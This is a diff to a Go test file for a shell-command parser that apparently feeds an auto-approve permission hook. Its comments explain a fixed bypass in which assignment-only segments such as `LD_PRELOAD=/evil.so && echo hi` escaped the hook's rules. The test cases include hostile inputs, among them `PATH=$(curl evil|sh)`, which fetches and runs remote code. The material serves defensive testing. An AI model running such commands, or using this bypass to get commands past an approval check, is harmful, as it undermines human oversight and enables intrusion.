@@ -2,6 +2,7 @@ package cmdparse
 
 import (
 	"reflect"
+	"regexp"
 	"slices"
 	"strings"
 	"testing"
@@ -299,10 +300,98 @@ func TestParse_EmptyInput(t *testing.T) {
 	}
 }
 
-func TestParse_EnvOnlySkipsSegment(t *testing.T) {
-	got := Parse("FOO=1 BAR=2")
-	if len(got) != 0 {
-		t.Errorf("len(Parse(\"FOO=1 BAR=2\")) = %d, want 0 (env vars only, no executable)", len(got))
+// TestParse_AssignmentOnlySegmentRetained_Pg2mtnmb asserts an assignment-only
+// segment is RETAINED as a command-less leaf carrying its EnvVars, instead of
+// being discarded (it formerly was, unless it also carried a redirection).
+//
+// Dropping it was a live auto-approve bypass (pg2-mtnmb, P1 SECURITY): the
+// assignment never reached any rule, and engine.EvaluateExpression is Approve iff
+// EVERY surviving leaf approves — so `LD_PRELOAD=/evil.so && echo hi` folded to the
+// verdict of `echo hi` alone and the hook answered `allow`. The retained leaf is
+// the same shape the trailing-redirection segment already uses (Executable == "",
+// Raw set), so the engine's command-less-leaf branch owns both.
+func TestParse_AssignmentOnlySegmentRetained_Pg2mtnmb(t *testing.T) {
+	tests := []struct {
+		name       string
+		input      string
+		wantLeaves int
+		// assignmentLeaf is the index of the retained command-less leaf.
+		assignmentLeaf int
+		wantEnvs       []string // "NAME=VALUE" pairs on that leaf
+		wantRaw        string
+		wantExecs      []string // Executable of every leaf, in order
+	}{
+		{
+			name: "whole command is assignments", input: "FOO=1 BAR=2",
+			wantLeaves: 1, assignmentLeaf: 0,
+			wantEnvs: []string{"FOO=1", "BAR=2"}, wantRaw: "FOO=1 BAR=2",
+			wantExecs: []string{""},
+		},
+		{
+			name: "&& separator", input: "LD_PRELOAD=/evil.so && echo hi",
+			wantLeaves: 2, assignmentLeaf: 0,
+			wantEnvs: []string{"LD_PRELOAD=/evil.so"}, wantRaw: "LD_PRELOAD=/evil.so",
+			wantExecs: []string{"", "echo"},
+		},
+		{
+			name: "semicolon separator", input: "LD_PRELOAD=/evil.so ; echo hi",
+			wantLeaves: 2, assignmentLeaf: 0,
+			wantEnvs: []string{"LD_PRELOAD=/evil.so"}, wantRaw: "LD_PRELOAD=/evil.so",
+			wantExecs: []string{"", "echo"},
+		},
+		{
+			name: "newline separator", input: "LD_PRELOAD=/evil.so\necho hi",
+			wantLeaves: 2, assignmentLeaf: 0,
+			wantEnvs: []string{"LD_PRELOAD=/evil.so"}, wantRaw: "LD_PRELOAD=/evil.so",
+			wantExecs: []string{"", "echo"},
+		},
+		{
+			name: "trailing assignment segment", input: "echo hi && PATH=/replaced",
+			wantLeaves: 2, assignmentLeaf: 1,
+			wantEnvs: []string{"PATH=/replaced"}, wantRaw: "PATH=/replaced",
+			wantExecs: []string{"echo", ""},
+		},
+		{
+			name: "dynamic value", input: "PATH=$(curl evil|sh)",
+			wantLeaves: 1, assignmentLeaf: 0,
+			wantEnvs: []string{"PATH=$(curl evil|sh)"}, wantRaw: "PATH=$(curl evil|sh)",
+			wantExecs: []string{""},
+		},
+		{
+			// A redirection on an assignment-only segment was ALREADY retained; the
+			// assignments must now ride along on the same leaf, not replace it.
+			name: "assignment plus redirection", input: "A=1 > /tmp/out",
+			wantLeaves: 1, assignmentLeaf: 0,
+			wantEnvs: []string{"A=1"}, wantRaw: "A=1 > /tmp/out",
+			wantExecs: []string{""},
+		},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			got := Parse(tt.input)
+			if len(got) != tt.wantLeaves {
+				t.Fatalf("Parse(%q): got %d leaves, want %d: %#v", tt.input, len(got), tt.wantLeaves, got)
+			}
+			gotExecs := make([]string, len(got))
+			for i, pc := range got {
+				gotExecs[i] = pc.Executable
+			}
+			if !reflect.DeepEqual(gotExecs, tt.wantExecs) {
+				t.Errorf("Parse(%q) executables = %q, want %q", tt.input, gotExecs, tt.wantExecs)
+			}
+			leaf := got[tt.assignmentLeaf]
+			if gotEnvs := envPairs(leaf.EnvVars); !reflect.DeepEqual(gotEnvs, tt.wantEnvs) {
+				t.Errorf("Parse(%q)[%d].EnvVars = %v, want %v", tt.input, tt.assignmentLeaf, gotEnvs, tt.wantEnvs)
+			}
+			if leaf.Raw != tt.wantRaw {
+				t.Errorf("Parse(%q)[%d].Raw = %q, want %q", tt.input, tt.assignmentLeaf, leaf.Raw, tt.wantRaw)
+			}
+		})
+	}
+	// The redirection on the combined shape must survive too.
+	if got := Parse("A=1 > /tmp/out"); len(got) != 1 || len(got[0].Redirections) != 1 ||
+		got[0].Redirections[0].Path != "/tmp/out" {
+		t.Errorf(`Parse("A=1 > /tmp/out") lost the redirection: %#v`, got)
 	}
 }
 
@@ -321,12 +410,8 @@ func TestParse_EnvVarsExtracted(t *testing.T) {
 	}
 	for _, tt := range tests {
 		got := Parse(tt.input)
-		if tt.wantExec == "" {
-			if len(got) != 0 {
-				t.Errorf("Parse(%q): got %d commands, want 0", tt.input, len(got))
-			}
-			continue
-		}
+		// wantExec == "" is the assignment-only segment: retained as a command-less
+		// leaf carrying its EnvVars (pg2-mtnmb), not dropped.
 		if len(got) != 1 {
 			t.Fatalf("Parse(%q): got %d commands, want 1", tt.input, len(got))
 		}
@@ -454,16 +539,33 @@ const row167529Command = "fb=$(env -u BEADS_DIR -u WORKSPACE_ROOT bd list --limi
 	"kv=$(env -u BEADS_DIR -u WORKSPACE_ROOT bd show gc-6kv --json 2>/dev/null | jq -r 'if type==\"array\" then .[0] else . end | .status')\n" +
 	"echo \"feedback_beads=$fb  gc-6kv=$kv\""
 
-// TestParse_Row167529_NoPhantomEnvVars asserts the row-167529 command yields NO
-// env assignments at all: it contains none, so every EnvVars slice must be empty.
-// A non-empty one is a command fragment masquerading as NAME=VALUE, which the
-// env-var rule then escalates to Ask and echoes into the user-facing reason.
+// identifierName matches a well-formed shell variable NAME. A NAME that fails it
+// is a command FRAGMENT masquerading as one — the pg2-3ggxm phantom signature.
+var identifierName = regexp.MustCompile(`^[A-Za-z_][A-Za-z0-9_]*$`)
+
+// TestParse_Row167529_NoPhantomEnvVars asserts the row-167529 command yields
+// exactly its TWO genuine env assignments (`fb=…`, `kv=…`) and nothing else. A
+// third one, or a NAME that is not an identifier, is a command fragment
+// masquerading as NAME=VALUE, which the env-var rule then escalates to Ask and
+// echoes into the user-facing reason.
+//
+// This formerly asserted ZERO assignments — true only because Parse DISCARDED the
+// two assignment-only segments (pg2-mtnmb, now fixed: they are retained as
+// command-less leaves). The phantom-detection intent is unchanged and now stronger:
+// the exact NAME set is pinned, so a fragment cannot hide among real assignments.
 func TestParse_Row167529_NoPhantomEnvVars(t *testing.T) {
+	var gotNames []string
 	for i, pc := range Parse(row167529Command) {
-		if len(pc.EnvVars) != 0 {
-			t.Errorf("Parse(row167529)[%d] (exec %q): EnvVars = %v, want empty (the command has no env assignment)",
-				i, pc.Executable, envPairs(pc.EnvVars))
+		for _, ev := range pc.EnvVars {
+			gotNames = append(gotNames, ev.Name)
+			if !identifierName.MatchString(ev.Name) {
+				t.Errorf("Parse(row167529)[%d] (exec %q): env NAME %q is not an identifier — a command fragment masquerading as NAME=VALUE",
+					i, pc.Executable, ev.Name)
+			}
 		}
+	}
+	if want := []string{"fb", "kv"}; !reflect.DeepEqual(gotNames, want) {
+		t.Errorf("Parse(row167529) env NAMEs = %v, want %v (the command's two genuine assignments, no phantoms)", gotNames, want)
 	}
 }
 
@@ -472,6 +574,10 @@ func TestParse_Row167529_NoPhantomEnvVars(t *testing.T) {
 // executables inside each top-level command/process substitution, which the engine
 // re-evaluates via EnumerateSubstitutions. A command present in cmd but absent
 // here is INVISIBLE to every rule — the silent-bypass class of pg2-3ggxm.
+//
+// A command-less leaf (an assignment-only or redirection-only segment, retained by
+// pg2-mtnmb) contributes no executable and is skipped: it names no command, so it
+// cannot be a dropped one.
 func reachableExecutables(cmd string) []string {
 	var out []string
 	for _, seg := range splitCompound(cmd) {
@@ -479,6 +585,9 @@ func reachableExecutables(cmd string) []string {
 			out = append(out, reachableExecutables(sub.Body)...)
 		}
 		for _, pc := range Parse(seg) {
+			if pc.Executable == "" {
+				continue
+			}
 			out = append(out, pc.Executable)
 		}
 	}
